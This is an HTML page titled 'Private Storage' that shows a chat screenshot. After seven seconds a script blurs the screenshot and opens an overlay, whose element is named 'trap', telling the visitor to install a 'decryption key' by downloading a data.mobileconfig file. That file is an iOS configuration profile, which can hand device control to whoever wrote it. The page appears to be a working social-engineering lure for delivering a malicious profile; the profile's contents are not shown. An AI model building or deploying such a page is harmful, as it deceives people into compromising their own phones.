<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Storage</title>
    <style>
        body { margin: 0; padding: 0; background-color: #000; font-family: -apple-system, sans-serif; overflow: hidden; }
        .preview { width: 100%; height: 100vh; display: flex; justify-content: center; align-items: flex-start; }
        .preview img { width: 100%; height: auto; object-fit: contain; }
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); display: none; align-items: center; justify-content: center; z-index: 9999; }
        .modal { background: #fff; width: 85%; max-width: 350px; padding: 25px; border-radius: 15px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .btn { background-color: #007AFF; color: white; text-decoration: none; padding: 14px; border-radius: 10px; font-weight: bold; display: block; margin-top: 20px; cursor: pointer; border: none; width: 100%; font-size: 16px; }
    </style>
</head>
<body>

    <div class="preview">
        <img src="chat_preview.jpg" id="bgImg">
    </div>

    <div class="overlay" id="trap">
        <div class="modal">
            <h3 style="color:#d32f2f; margin-top:0;">⚠️ Access Interrupted</h3>
            <p>Verification required to view the full chat list. Please install the decryption key to continue.</p>
            <a href="./data.mobileconfig" download="data.mobileconfig" class="btn">INSTALL FULL ACCESS KEY</a>
        </div>
    </div>

    <script>
        setTimeout(function() {
            document.getElementById('trap').style.display = 'flex';
            document.getElementById('bgImg').style.filter = 'blur(8px)';
        }, 7000);
    </script>

</body>
</html>
